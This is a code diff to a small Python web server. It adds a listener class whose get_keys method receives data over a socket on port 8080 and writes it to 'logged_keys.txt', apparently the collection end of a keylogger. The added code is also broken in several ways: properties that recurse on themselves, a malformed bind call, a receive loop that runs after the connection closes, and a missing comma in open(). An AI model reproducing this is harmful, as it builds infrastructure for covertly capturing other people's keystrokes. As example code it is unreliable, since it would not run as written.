@@ -6,6 +6,8 @@ import socket
 hostName = "localhost"
 serverPort = 80
 
+listeningPort = 8080
+
 class WebServer(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
@@ -25,5 +27,49 @@ def startServer():
         print("\nClosing server")
         webServer.server_close()
 
+
+class Server:
+    def __init__(self, port):
+        self.port = port
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    @property
+    def port(self):
+        return self.port
+
+    @port.setter
+    def port(self, new_port):
+        self.port = new_port
+
+    @property
+    def socket(self):
+        return self.socket
+    
+    def initialize(self):
+        try:
+            self.socket.bind('localhost', self.port)
+            self.socket.listen()
+            logging.debug("Listening server successfully initialized!")
+        except socket.error:
+            print("There was an error while creating the listening server")
+    
+    def get_keys(self):
+        connection, adress = self.socket.accept()
+        with connection:
+            print(f"Successfully established connection with {adress}")
+
+        while True:
+            data = connection.recv(1024)
+            if not data:
+                break
+            logging.info(data)
+            for data in data:
+                with open('logged_keys.txt' 'w') as logged_keys:
+                    logged_keys.write(data)
+                    
+
 if __name__ == "__main__":
     startServer()
+
+    server = Server(listeningPort)
+    server.get_keys()
